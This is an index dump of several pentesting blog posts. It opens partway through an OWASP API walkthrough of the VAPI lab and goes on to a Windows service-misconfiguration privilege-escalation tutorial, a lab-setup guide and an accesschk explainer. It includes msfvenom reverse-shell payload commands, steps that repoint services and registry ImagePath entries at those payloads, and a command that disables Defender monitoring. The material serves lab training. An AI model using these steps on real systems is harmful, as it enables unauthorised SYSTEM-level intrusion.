http://127.0.0.1/vapi/api9/v1/user/login --hh 0 -t 100 The \u0026ldquo;\u0026ndash;hh 0\u0026rdquo; means hide responses with zero (0) characters. \u0026ldquo;-t 100\u0026rdquo; uses 100 threads.\nFrom the above command output, the PIN is \u0026ldquo;1655\u0026rdquo;. Step 4. Back to either Postman or Burp Suite, let\u0026rsquo;s log in using the above PIN..\nUsing Postman Using burp suite From the above results, we have successfully logged in We have successfully exploited the improper assignment vulnerability. How to Prevent To ensure API security, inventory and document all hosts and integrated services, document all aspects of your API, generate documentation automatically, use external measures like API security firewalls, avoid using production data with non-production deployments, and perform a risk analysis when updating versions.\nLearn more about this vulnerability at API9:2019 Improper Assets Management\nAPI10:2019 Insufficient Logging \u0026amp; Monitoring The lack of logging and monitoring makes it easy for attackers to abuse systems without being detected, as suspicious activities cannot be tracked and responded to in a timely manner. This gives attackers ample time to fully compromise the systems without being detected.\nvapi collection in Postman, send the request.\nThe below output is the flag for vapi/api10. This is just showing that all the testing was not monitored or logged. That is the vulnerability in itself.\nOutput in Postman Output In Burp Suite. How to prevent this vulnerability. To enhance API security, it\u0026rsquo;s important to log failed authentication attempts and input errors, maintain log integrity, and monitor the system with a SIEM tool. Custom alerts and dashboards can help detect suspicious activity.\nFor more about this vulnerability check out API10:2019 Insufficient Logging \u0026amp; Monitoring\nIn conclusion. The OWASP API Security Top 10 2019 highlights the most critical API security risks that developers and organizations should be aware of. However, with the 2023 update currently in preparation, it\u0026rsquo;s important to stay up-to-date on the latest API security best practices.\nFortunately, there are several resources available to help you deepen your knowledge of API security, including the APISec University and the book \u0026ldquo;Hacking APIs\u0026rdquo; by Corey J Ball. Additionally, the OWASP website provides valuable information on the current state of API security, including the previous Top 10 list.\nFinally, keeping up with industry experts like Alissa Knight can provide valuable insights and perspectives on API security. By utilising these resources and staying informed, you can better protect your APIs against emerging threats and ensure the security of your organisation\u0026rsquo;s data.\n","date":"April 28, 2023","hero":"/posts/api-penetration-testing/owasp-api-top10-vapi-walkthrough/hero.png","permalink":"http://localhost:1313/posts/api-penetration-testing/owasp-api-top10-vapi-walkthrough/","summary":"According to a Gartner report in 2020 APIs account for 90% of the attack surface and are the most frequent attack vector.\nAPIs often handle sensitive data, such as personal information, financial data, and intellectual property. If an API is not properly secured, this data can be easily accessed and stolen by hackers. In fact, some of the recent big data breaches have been due to under-protected APIs.\nIn this blog post, I am going to discuss OWASP top 10 API 2019 vulnerabilities by using VAPI.","tags":null,"title":"OWASP API Security Top 10 via VAPI Walkthrough"},{"categories":null,"contents":"Privilege escalation is a common technique used by penetration testers to test unauthorised access to a system. One way to achieve privilege escalation is through service misconfigurations in Windows.\nA service is a program that runs in the background on a Windows system, and it can have a variety of functions such as managing network connections, printing, or running scheduled tasks. Services can be configured to run under different user accounts, and some may have higher privileges than others. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges too.\nIn this blog post, we\u0026rsquo;ll discuss these Service Misconfigurations:\n1. Insecure Service Properties 2. Unquoted Service Path 3. Weak Registry Permissions 4. Insecure Service Executables 5. DLL Hijacking. The following are service commands that will be used. To query the configuration of a service: sc.exe qc \u0026lt;service name\u0026gt;\nTo query the current status of a service: sc.exe query \u0026lt;service name\u0026gt;\nTo modify a configuration option of a service: sc.exe config \u0026lt;service name\u0026gt; \u0026lt;option\u0026gt;= \u0026lt;value\u0026gt;. Please leave one space after equal sign.\nTo start a service: net start \u0026lt;service name\u0026gt;\nTo stop a service: net stop \u0026lt;service name\u0026gt;\nNote: To follow along or get the best out of this blog, please check how to set up a virtual lab that we are going to be using. After having your lab set up, now let\u0026rsquo;s go through each type of service misconfiguration.\nInsecure service permissions Permissions to access a certain resource in Windows are controlled by the access control list (ACL) for that resource. Each service has an ACL that defines certain service-specific permissions.\nSome permissions are harmless because they can\u0026rsquo;t give us a way to run executable files (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS).\nSome may be useful (e.g. SERVICE_STOP, SERVICE_START).\nSome are dangerous (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS) because If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.\nNOTE : If we cannot stop/start the service, we may not be able to escalate privileges! This applies to all service privilege escalation.\nSteps to exploit this misconfiguration Step 1 Run winPeas to enumerate and identify potential vulnerabilities in a Windows system.\n.\\winPEASany.exe quiet servicesinfo\nThe above command runs WinPEAS in quiet mode and specifically focuses on gathering information about Windows services. Running this command, WinPEAS will enumerate all installed Windows services and provide information about their status, display name, service name, path, and description. Additionally, it will look for services with weak permissions or misconfigured service binaries that may be vulnerable to privilege escalation.\nBy default, WinPEAS will save the output to a file named winPEAS.\u0026lt;timestamp\u0026gt;.txt in the current directory. You can use the \u0026gt; operator to redirect the output to a different file or location.\nStep 2 After running the above command, we can read the output file and identify service permissions of our user to check if there is a service with SYSTEM privileges and we have permission to modify it.\nIf you are using the virtual lab we created before, after running the above command we can verify this on the winpeas output.\nIn the above screenshot, we can see daclsvc service can be modified. This can also be confirmed on the modifiable services section on winpeas file.\nStep 3 Verify if the above service is modifiable with accesschk. For more about accesschk tool and how to use it, please check accesschk write-up.\nRun this command to check more info about the service .\\accesschk.exe -uwcqv user daclsvc\nFrom the above output, we can see the permissions we have. However, the two most important permissions are to start/stop the service and to change the configuration of the service.\nStep 4. Enumerate this service to see more information and check its current status.\nTo enumerate this service, use the command sc qc daclsvc To check the status of the service, use the command sc query daclsvc As we can see from the output of our commands: From the above results:\nThe service is configured to demand start, meaning it has to be started manually. The binary path name points to daclservice.exe. The service has no dependencies. It should also run with the permissions of LocalSystem. The service is currently stopped, meaning after we reconfigure the service, we can start it to trigger the exploit. Step 5. Since we have the permission to configure the service, we can configure the binary path to the path of our reverse shell payload. To achieve that, run sc config daclsvc binpath=\u0026quot;\\C:\\PrivEsc\\reverse.exe\\\u0026quot; (set the path to your reverse shell path).\nStep 6. Start a listener with netcat: Step 7. Start a service where our reverse shell payload will be executed: As you can see from the above, we have a reverse shell with system privileges.\nUnquoted Service Path In Windows, it is possible to run executable files without specifying their file extension, for example, running \u0026quot;ipconfig.exe\u0026quot; by typing \u0026quot;ipconfig\u0026quot;. However, some executables require additional arguments to be passed to them, separated by spaces, such as \u0026quot;program.exe arg1 arg2 arg3...\u0026quot;. This can create ambiguity when using absolute paths that contain spaces and are unquoted, which can cause the wrong executable to be run.\nSuppose we have an unquoted path in Windows, such as \u0026quot;C:\\Program Files\\Directory DirName\\Program.exe\u0026quot;. While it\u0026rsquo;s clear to us that the intended executable is Program.exe, Windows may interpret \u0026quot;C:\\Program\u0026quot; as the executable with two arguments: \u0026quot;Files\\Directory\u0026quot; and \u0026quot;DirName\\Program.exe\u0026quot;. or \u0026quot;C:\\Program Files\\Directory\u0026quot; as the executable with argument \u0026quot;DirName\\Program.exe\u0026quot;.\nTo resolve this ambiguity, Windows checks each of the possible executable paths in turn. This creates a security vulnerability, as an attacker could potentially trick a service into running a malicious executable instead of the intended one by writing the malicious file to a location that Windows checks before the actual executable.\nSteps to exploit this misconfiguration. From the winpeas output that we run before (.\\winPEASany.exe quiet servicesinfo) we can see this misconfiguration on service information section. Step 1. Query the configuration of the service sc qc unquotedsvc Here is the output. From the output of our query, the path is C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe It has LocalSystem privileges, meaning if we can run our reverse shell payload, we will have System privileges. It demands start Step 2. Use accesschk.exe to see if we have permission to start the service (if we don\u0026rsquo;t, then we can\u0026rsquo;t exploit it even if it is vulnerable), and writable permission.\nChecking if we have permission to start the service.\n.\\accesschk.exe -ucqv user unquotedsvc We can see that we have permission to start and stop the service. Step 3. Using accesschk.exe to check for writable permissions of C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe\nCheck write permission of C:\\ run .\\accesschk.exe -uwdq C:\\ Check write permission of C:\\Program Files\\ run .\\accesschk.exe -uwdq \u0026quot;C:\\Program Files\\\u0026quot; Check write permission of C:\\Program Files\\Unquoted Path Service\\Common Files run .\\accesschk.exe -uwdq \u0026quot;C:\\Program Files\\Unquoted Path Service\\\u0026quot; From the above results, we can see the C:\\Program Files\\Unqouted Path Service directory all BUILTIN\\Users have the RW permissions This means, if we create a file in this directory, when the service starts, it will execute.\nStep 4. Let\u0026rsquo;s copy our reverse shell into this directory where we have write permission. copy C:\\PrivEsc\\reversee.exe \u0026quot;C:\\Program Files\\Unquoted Path Service\\reversee.exe\u0026quot; (change the reversee.exe to the name of your reverse shell) Step 5. Set up a listener on a Linux machine and start the service. From the above result, we\u0026rsquo;ve got the shell back with system privileges.\nWeak Registry Permissions Weak registry permissions relate to access control issues in the Windows registry, which acts as a central database that stores configuration settings for the operating system and applications. Specifically, weak registry permissions imply that the permissions given to certain registry keys or values are excessively permissive, granting non-administrator users or attackers the ability to modify or delete critical registry entries. This can result in numerous security concerns such as privilege escalation, persistence, and the ability to execute malicious code.\nMisconfigured Access Control Lists (ACLs) on registry entries can enable an attacker to modify a service\u0026rsquo;s configuration, even if they do not have direct access to modify the service itself.\nThe following are steps to exploit this misconfiguration. Using our lab and the result of winpeas (.\\winPEASany.exe quiet servicesinfo) As it appears our user can modify the registry entry of regsvc service.\nStep 1. Verify the permissions\nusing Powershell run PS\u0026gt; Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\regsvc | Format-List From the results above, we can see that NT AUTHORUTY\\INTERACTIVE has full control. Step 2. Use accesschk to see if we can stop or start a service. .\\accesschk.exe -ucqv user regsvc From the above picture, it appears that we do have permission to start and stop the service.\nLet\u0026rsquo;s check the current values of the regsvc. reg query HKLM\\System\\CurrentControlSet\\Services\\regsvc From the results, it appears that the ImagePath is set to \u0026quot;C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe\u0026quot; and it executes with localsystem privileges.\nStep 3: Overwrite the ImagePath registry key to point to our reverse shell executable: reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reversee.exe /f Step 4. Set up a listener on a Linux machine and start the service. As we can see above, we have got the shell back with system privileges.\nInsecure Service Executables Insecure Service Executables are a common vulnerability that can be exploited by attackers to escalate their privileges on a system. A service executable is a programme that runs in the background and provides functionality to other programmes or users on the system. If a service executable is not properly secured, an attacker can potentially exploit it to gain elevated privileges on the system.\nThere are several ways that an insecure service executable can lead to privilege escalation. For example, an attacker may be able to exploit a buffer overflow or other vulnerability in the service to execute arbitrary code with elevated privileges. Alternatively, the attacker may be able to replace the legitimate service executable with a malicious one that provides them with elevated privileges.\nAs we can see in the output of WinPEAS (.\\winPEASany.exe quiet servicesinfo): Steps to exploit this misconfiguration: Step 1. Use Accesschk.exe to check the permissions of the executable: .\\accesschk.exe -uqvw \u0026quot;C:\\Program Files\\File Permissions Service\\filepermservice.exe\u0026quot; From the above output, we have all permissions of the file. Step 2. Check if we can start and stop the service: Run .\\accesschk.exe -quvc filepermsvc\nFrom the output above, we can start and stop the service We can configure the service. Step 3. Backup the original file: copy \u0026quot;C:\\Program Files\\File Permissions Service\\filepermservice.exe\u0026quot; C:\\Temp\nStep 4. Copy the reverse shell executable and overwrite the original executable. Use the following command. Change the name of the reverse shell payload to yours: copy C:\\PrivEsc\\reversee.exe \u0026quot;C:\\Program Files\\File Permissions Service\\filepermservice.exe\u0026quot; Step 5. Set up a listener on a Linux virtual machine and start the service: As you can see in the above output, we have the authority/system privileges. Restore the original file. DLL Hijacking DLL hijacking is a type of attack that involves replacing a legitimate Dynamic Link Library (DLL) with a malicious one in order to execute unauthorised code on a system. This attack can be used to escalate privileges on a system.\nDLL hijacking can be used as part of a privilege escalation attack if the attacker is able to replace a DLL that is loaded by a process running with higher-level privileges, such as an administrative account or a system service.\nWhen the malicious DLL is loaded by the targeted process, it can execute arbitrary code with the same level of privileges as the process. This can allow an attacker to perform actions that would normally be restricted, such as accessing sensitive data or running commands with elevated privileges.\nAs we can see from the WinPEAS output of our testing lab (.\\winPEASany.exe quiet servicesinfo): Steps to exploit this misconfiguration. Step 1. Enumerate all services in the WinPEAS output to see which one our user can start and stop.\nFor the sake of the length of this blog, I am going to only focus on dllsvc, and here is the output. From the WinPEAS output, the dllsvc runs at this path \u0026quot;C:\\Program Files\\DLL Hijack Service\\dllhijackservice.exe\u0026quot; We can start and stop the dllsvc from the above output. Step 2. Query the configuration of the service for more information. sc qc dllsvc From the above output:\nIt requires demand_start The binary path name is C:\\Program Files\\DLL Hijack Service\\dlljackservice.exe It has local system privileges. Step 3. We have to copy this file (dllhijackservice.exe) into the Windows machine that we have administrator privileges to investigate the program more.\nIn our lab, we can use our Windows virtual machine to test this, but in the real world, copy the file and investigate it more in another machine with admin privileges. Step 4. Use Procmon to investigate more about the service. Step 5. Configure Procmon64.exe as follows:\nRun it with administrator privileges. Use the password of the admin which is password123. Stop and clear the current capture\nPress Ctrl+L to open the Filter menu.\nAdd a new filter on the Process Name matching dllhijackservice.exe. On the main screen, deselect registry activity and network activity. Step 6. Start the service in the Windows virtual machine. net start dllsvc Step 7. Investigate the result of Pocmon capture. From the output:\nWe can see the number of NOT FOUND error messages for hijackme.dll file We can see Windows is trying to go into each folder to find the file, and at some point, it went into C:\\Temp\\ folder where we have write permission to find hijackme.dll file We can create our file with a reverse shell named hijackme.dll and put it in this folder, and Windows will execute it. Step 8. Create DLL reverse shell in Linux using this command msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.217 LPORT=7676 -f dll -o hijackme.dll\nPlease change the IP address of the command to yours and port number to the one you want to listen to. Transfer this file into the C:\\Temp folder by copy \\\\192.168.1.217\\tools\\hijackme.dll C:\\Temp\\ Step 9. Create a listener on your Linux machine\nStop the dllsvc service and restart it again. In the above output, we can see we have successfully escalated our privileges.\nCongratulations for making it to the end of this lengthy post. The above step-by-step explanation of how to exploit service misconfigurations can be used on any Windows system. To deepen your knowledge, check out TIb3rius course called Windows Privilege Escalation for OSCP \u0026amp; Beyond!\n","date":"February 23, 2023","hero":"/posts/privilege-escalation/windows/service-misconfigurations/hero.png","permalink":"http://localhost:1313/posts/privilege-escalation/windows/service-misconfigurations/","summary":"Privilege escalation is a common technique used by penetration testers to test unauthorised access to a system. One way to achieve privilege escalation is through service misconfigurations in Windows.\nA service is a program that runs in the background on a Windows system, and it can have a variety of functions such as managing network connections, printing, or running scheduled tasks. Services can be configured to run under different user accounts, and some may have higher privileges than others.","tags":null,"title":"Service Misconfiguration"},{"categories":null,"contents":"A Step-by-Step Guide When it comes to privilege escalation, the biggest obstacle learners face is where to practice. Most of the time, this is a step that comes after performing all other steps like reconnaissance, scanning, and gaining low privilege user access. When I was looking to better understand privilege escalation, I wanted a lab where I could practice this step alone, without having to go through different steps to gain low privilege user access. This blog post will help you with that. We will learn how to set up a lab where we can practice our craft\nTo create a lab for testing and learning Windows privilege escalation, the following steps will help achieve that. As this is a post-exploitation process, this write-up assumes that the reader understands how to set up a hacking lab using virtual machine software and how to use Linux.\nThe following are the steps to set up a lab for practising Windows privilege escalation:\nStep 1: Ensure that you have a virtual machine software with Linux installed. This is because we will be installing the Windows 10 that we will be attacking into the same virtual machine sotware.\nStep 2: Download the Windows 10 ISO from the Microsoft website and download the following tools to your Linux directory: PowerUp.ps1, winPEASany.exe, setup script, and so on. You can download all the tools you want to use for Windows privilege escalation.\nStep 3: Install Windows 10 into a virtual machine. Again, as this is a post-exploitation step, it as sumes that you have a basic knowledge of setting up a hacking lab.\nStep 4: Log in to the Windows 10 machine and perform the following:\nEnable SMB version 1 for easier file transfer. To do this, open PowerShell as an administrator and run: Enable-WindowsOptionalFeature -Online -FeatureName \u0026quot;SMB1Protocol-Client\u0026quot; -All\nDisable real-time protection on Windows. Open PowerShell as an administrator and run: Set-MpPreference -DisableRealtimeMonitoring $true\nStep 5: If you downloaded the tools into the Windows 10 that we installed, then continue with step 7. If you used a Linux machine to download the tools and script above, change the directory to the one with the tools and set up an SMB server in a directory where the tools are with the following command (my directory\u0026rsquo;s name is tools, change the directory name in the command to that of yours): python /usr/share/doc/python3-impacket/examples/smbserver.py tools .\nThe above screenshot shows tools in my kali machine.\nThe above screenshot shows the python command to setup smb server.\nStep 6: In our Windows 10, since we already enabled SMB protocol, open the Command Prompt (CMD) as an administrator and copy the setup.bat file from the Kali Linux machine where we set up the SMB server to our Windows machine using the following command:\ncopy \\\\{put IP address of the Linux machine}\\{folder where you set up an SMB server}\\setup.bat . e.g. copy \\\\192.168.1.123\\tools . Step 7. Run the setup script. On your cmd as administrator, change folder to where you saved the script and run the following command. .\\setup.bat\nWhen the script finishes, restart Windows. Step 8. The VM (Windows machine) should auto-login as an admin user. We have to sign out and login as a user in order to continue with Windows privilege escalation practices. Credentials for logging in after running a setup script\nUser: User, password: password321 User: Admin, password: password123 Sometimes after you log in as a user, you will get a command prompt asking you for an Admin password. Provide the above password to continue. Step 9. Create a snapshot of your VM if the VM software you are using supports it. This will let you reset the VM to this exact point if you want to start again with a fresh setup. A writable directory exists in the C drive called PrivEsc. You can use this directory to save files. Step 10. In your Linux machine, create a reverse shell payload that will be used in a Windows machine when we have any admin privilege to execute commands. Run the following msfvenom command on Linux terminal\n# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.127 LPORT=53 -f exe -o reverse.exe\nPlease change the LHOST to your Linux IP address, and LPORT to the port you want to listen to. This reverse shell can be caught using netcat or Metasploit’s own multi/handler.\nCopy this payload into windows PrivEsc folder. e.g. copy\\\\192.168.1.123\\tools\\reverse.exe . Then create a listener using netcat or metasploit\u0026rsquo;s multi/handler. Run the reverse shell payload (.\\reverse.exe) to continue with the practise using linux machine instead on windows machine Conclusion The aforementioned steps demonstrate how to establish a lab for practising Windows privilege escalation. By following these instructions, you can create a completely functional lab environment to enhance your skills in Windows privilege escalation. Through this lab, you can gain valuable insights into identifying and exploiting vulnerabilities, comprehending the intricacies of escalating privileges, and improving your ability to secure Windows systems.\n","date":"February 16, 2023","hero":"/posts/privilege-escalation/windows/setting-up-a-lab/hero.jpg","permalink":"http://localhost:1313/posts/privilege-escalation/windows/setting-up-a-lab/","summary":"A Step-by-Step Guide When it comes to privilege escalation, the biggest obstacle learners face is where to practice. Most of the time, this is a step that comes after performing all other steps like reconnaissance, scanning, and gaining low privilege user access. When I was looking to better understand privilege escalation, I wanted a lab where I could practice this step alone, without having to go through different steps to gain low privilege user access.","tags":null,"title":"Windows Privilege Escalation lab"},{"categories":null,"contents":"Access Control and Privilege Escalation: Understanding Accesschk.exe\nAccesschk.exe, part of the Sysinternals Suite, is a command-line utility that checks the access rights of files, registry keys, and other resources in Windows.\nHere are some examples of commands to check access rights:\nReport effective permissions on a file: accesschk.exe -e c:\\example.txt Check explicit permissions on a registry key: accesschk.exe -k HKEY_LOCAL_MACHINE\\SOFTWARE\\example Check inherited permissions on a service: accesschk.exe -i -s example Check effective permissions on a file for a specific user: accesschk.exe -u DOMAIN\\username c:\\example.txt Check effective permissions on a process for a specific group: accesschk.exe -p -uc DOMAIN\\groupname example.exe Accesschk.exe can also be used in Windows privilege escalation, which involves gaining access to resources or privileges that are not normally available to a user. For instance, you can use the command accesschk.exe -uwcqv \u0026quot;SYSTEM\u0026quot; * to check which services are running as the SYSTEM user.\nHere are the options that control accesschk.exe:\n-u: Shows only the permissions for a specified user or group. -w: Shows the owner and their access rights of the object. -c: Shows the effective access rights for a user or group, taking into account any deny permissions. -q: Suppresses any output other than the access rights information itself. -v: Shows the names of all objects that accesschk.exe scans. You can combine these options in various ways to get the specific information you need. For example, accesschk.exe -uc jsmith c:\\windows\\system32 shows the effective access rights for the user \u0026ldquo;jsmith\u0026rdquo; in the \u0026ldquo;c:\\windows\\system32\u0026rdquo; directory.\nAnother way to use Accesschk.exe is to identify registry keys and files that have overly permissive access controls. For example, accesschk.exe -w -accepteula * checks for all registry keys that are writable by the Everyone group.\n","date":"February 15, 2023","hero":"/posts/toolkit/accesschk.exe/hero.png","permalink":"http://localhost:1313/posts/toolkit/accesschk.exe/","summary":"Access Control and Privilege Escalation: Understanding Accesschk.exe\nAccesschk.exe, part of the Sysinternals Suite, is a command-line utility that checks the access rights of files, registry keys, and other resources in Windows.\nHere are some examples of commands to check access rights:\nReport effective permissions on a file: accesschk.exe -e c:\\example.txt Check explicit permissions on a registry key: accesschk.exe -k HKEY_LOCAL_MACHINE\\SOFTWARE\\example Check inherited permissions on a service: accesschk.exe -i -s example Check effective permissions on a file for a specific user: accesschk.","tags":null,"title":"Accesschk.exe"},{"categories":null,"contents":"Welcome Are you fascinated by the world of cybersecurity and the art of penetration testing? Look no further! Here, I document my journey as a penetration tester as I solve online cybersecurity challenges and share my knowledge and experiences with the community. This journey is not only a way for me to learn more about the field, but also an opportunity for me to help others learn and grow in their understanding of cybersecurity.\nPenetration testing, also known as \u0026ldquo;ethical hacking,\u0026rdquo; is the process of simulating an attack on a computer system, network, or web application to evaluate its security. It is a crucial aspect of cybersecurity and helps organisations identify vulnerabilities and weaknesses before they can be exploited by malicious actors.\nAs a penetration tester I will be sharing my journey and experiences as I tackle various online challenges and CTFs. I will provide detailed walkthroughs and write-ups of my process, including the tools and techniques used, so that you can learn and apply the same skills. Additionally, I will also share my knowledge about red teaming, which is a form of penetration testing that simulates advanced persistent threats(APT) and is used to test the overall security posture of an organisation.\nWhether you are a seasoned professional or just getting started in the field, I hope you will find the content on my blog informative and valuable. I will be updating the blog regularly with new challenges, so be sure to check back often. I also encourage you to share your own insights and experiences by reaching out of my provided social accounts, and to let me know if there are any specific topics you would like me to cover.\nIf you are interested in projects or have any enquiries, please don\u0026rsquo;t hesitate to contact me via email or direct message on the provided social media accounts.\nJoin me on this exciting journey as I explore the world of penetration testing and take on the challenge of keeping our online world secure while also helping others to learn and grow in the field. Thank you for visiting my blog and for taking an interest in cybersecurity!\n","date":"January 19, 2023","hero":"/posts/welcome/hero.png","permalink":"http://localhost:1313/posts/welcome/","summary":"Welcome Are you fascinated by the world of cybersecurity and the art of penetration testing? Look no further! Here, I document my journey as a penetration tester as I solve online cybersecurity challenges and share my knowledge and experiences with the community. This journey is not only a way for me to learn more about the field, but also an opportunity for me to help others learn and grow in their understanding of cybersecurity.","tags":null,"title":"Penetration Testing Blog!"},{"categories":null,"contents":"google-site-verification: google379bb4308c7d83a5.html","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"http://localhost:1313/google379bb4308c7d83a5/","summary":"google-site-verification: google379bb4308c7d83a5.","tags":null,"title":""}]